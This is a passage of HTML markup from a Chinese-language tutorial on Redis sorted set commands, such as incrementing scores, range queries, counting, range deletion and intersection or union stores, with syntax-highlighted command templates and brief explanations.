class=\"crayon-sy\">.</span><span class=\"crayon-sy\">]</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/c550abf5ffe862b57098ca8d75fde4c0.png\" width=\"336\" height=\"73\"></p>\n<p>返回的结果为成功删除元素的个数，因为 zrem 命令是支持批量删除的。</p>\n<ul>\n<li>增加元素分数</li>\n</ul>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad0892da576966914\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nzincrby key increment member</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad0892da576966914-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad0892da576966914-1\"><span class=\"crayon-e\">zincrby </span><span class=\"crayon-e\">key </span><span class=\"crayon-e\">increment </span><span class=\"crayon-v\">member</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/e7167c2e45e4477bc59e12bb8aa6e238.png\" width=\"382\" height=\"65\"></p>\n<p>虽然 zincrby 命令是增加元素分数的，但我们也可以指定负数，这样当前元素的分数，则会相减。</p>\n<ul>\n<li>返回指定排名范围的元素</li>\n</ul>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad0892dd736368011\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nzrange key start stop [WITHSCORES]\r\nzrevrange key start stop [WITHSCORES]</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad0892dd736368011-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6ad0892dd736368011-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad0892dd736368011-1\"><span class=\"crayon-e\">zrange </span><span class=\"crayon-e\">key </span><span class=\"crayon-e\">start </span><span class=\"crayon-i\">stop</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">WITHSCORES</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6ad0892dd736368011-2\"><span class=\"crayon-e\">zrevrange </span><span class=\"crayon-e\">key </span><span class=\"crayon-e\">start </span><span class=\"crayon-i\">stop</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">WITHSCORES</span><span class=\"crayon-sy\">]</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0011 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/9f62d98bb7f227031bc97c9bc126f453.png\" width=\"508\" height=\"306\"></p>\n<p>zrange 命令是通过分数从低到高返回数据，而 zrevrange 命令是通过分数从高到低返回数据。如果执行命令时添加了 WITHSCORES 可选参数，则返回数据时会返回当前元素的分数。</p>\n<ul>\n<li>返回指定分数范围的元素</li>\n</ul>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad0892e2122756630\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nzrangebyscore key min max [WITHSCORES] [LIMIT offset count]\r\nzrevrangebyscore key max min [WITHSCORES] [LIMIT offset count]</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad0892e2122756630-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6ad0892e2122756630-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad0892e2122756630-1\"><span class=\"crayon-e\">zrangebyscore </span><span class=\"crayon-e\">key </span><span class=\"crayon-e\">min </span><span class=\"crayon-i\">max</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">WITHSCORES</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-e\">LIMIT </span><span class=\"crayon-e\">offset </span><span class=\"crayon-v\">count</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6ad0892e2122756630-2\"><span class=\"crayon-e\">zrevrangebyscore </span><span class=\"crayon-e\">key </span><span class=\"crayon-e\">max </span><span class=\"crayon-i\">min</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">WITHSCORES</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-e\">LIMIT </span><span class=\"crayon-e\">offset </span><span class=\"crayon-v\">count</span><span class=\"crayon-sy\">]</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/2340562372478164c677fdcdf54fd4e1.png\" width=\"596\" height=\"510\"></p>\n<p>min 和 max 参数还支持开区间(小括号)和闭区间(中括号)，同时我们还可以用 -inf 和 +inf 参数代表无限小和无限大。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/74112fd7bc941f5327ba07a11bad199e.png\" width=\"497\" height=\"391\"></p>\n<ul>\n<li>返回指定分数范围元素个数</li>\n</ul>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad0892e6057958774\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nzcount key min max</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad0892e6057958774-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad0892e6057958774-1\"><span class=\"crayon-e\">zcount </span><span class=\"crayon-e\">key </span><span class=\"crayon-e\">min </span><span class=\"crayon-v\">max</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/0c6cee2383de790299aa69bcac8a3deb.png\" width=\"373\" height=\"69\"></p>\n<ul>\n<li>删除指定排名内的升序元素</li>\n</ul>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad0892ea879251989\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nzremrangebyrank key start stop</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad0892ea879251989-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad0892ea879251989-1\"><span class=\"crayon-e\">zremrangebyrank </span><span class=\"crayon-e\">key </span><span class=\"crayon-e\">start </span><span class=\"crayon-v\">stop</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/47daedbac97a44de1900d5e8cc5dee69.png\" width=\"491\" height=\"132\"></p>\n<ul>\n<li>删除指定分数范围元素</li>\n</ul>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad0892ed566536634\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nzremrangebyscore key min max</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad0892ed566536634-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad0892ed566536634-1\"><span class=\"crayon-e\">zremrangebyscore </span><span class=\"crayon-e\">key </span><span class=\"crayon-e\">min </span><span class=\"crayon-v\">max</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/450994dc892494011bde9fe06d29587a.png\" width=\"602\" height=\"239\"></p>\n<p> </p>\n<h3>2.集合间操作</h3>\n<ul>\n<li>交集</li>\n</ul>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad0892f0285572348\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nzinterstore destination numkeys key [key ...] [WEIGHTS weight] [AGGREGATE SUM|MIN|MAX]</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad0892f0285572348-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad0892f0285572348-1\"><span class=\"crayon-e\">zinterstore </span><span class=\"crayon-e\">destination </span><span class=\"crayon-e\">numkeys </span><span class=\"crayon-i\">key</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-i\">key</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-e\">WEIGHTS </span><span class=\"crayon-v\">weight</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-e\">AGGREGATE </span><span class=\"crayon-v\">SUM</span><span class=\"crayon-o\">|</span><span class=\"crayon-v\">MIN</span><span class=\"crayon-o\">|</span><span class=\"crayon-v\">MAX</span><span class=\"crayon-sy\">]</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p>zinterstore 命令参数比较多：</p>\n<ul>\n<li>destination：将交集的计算结果，保存到这个键中。</li>\n<li>numkeys：需要做交集计算键的个数。</li>\n<li>key [key …]：需要做交集计算的键。</li>\n<li>WEIGHTS weight：每个键的权重，在做交集计算时，每个键中的分数值都会乘以这个权重，默认每个键的权重为 1。</li>\n<li>AGGREGATE SUM|MIN|MAX：计算成员交集后，分值可以按照 sum(和)、min(最小值)、max(最大值)做汇总，默认值为  sum。</li>\n</ul>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/ac15f280cb2ae2d9208d4d292fc6cab1.png\" width=\"628\" height=\"303\"></p>\n<p>下面我们将权重设置为 0.5，这样当计算交集后，有序集合中的元素分数将都会减半，并且使用 max 参数汇总。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/7364fd999fb8e4984bdcd7bf751f3d21.png\" width=\"724\" height=\"180\"></p>\n<ul>\n<li>并集</li>\n</ul>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad0892f4279419288\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nzunionstore destination numkeys key [key ...] [WEIGHTS weight] [AGGREGATE SUM|MIN|MAX]</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad0892f4279419288-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad0892f4279419288-1\"><span class=\"crayon-e\">zunionstore </span><span class=\"crayon-e\">destination </span><span class=\"crayon-e\">numkeys </span><span class=\"crayon-i\">key</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-i\">key</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-e\">WEIGHTS </span><span class=\"crayon-v\">weight</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-e\">AGGREGATE </span><span class=\"crayon-v\">SUM</span><span class=\"crayon-o\">|</span><span class=\"crayon-v\">MIN</span><span class=\"crayon-o\">|</span><span class=\"crayon-v\">MAX</span><span class=\"crayon-sy\">]</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] 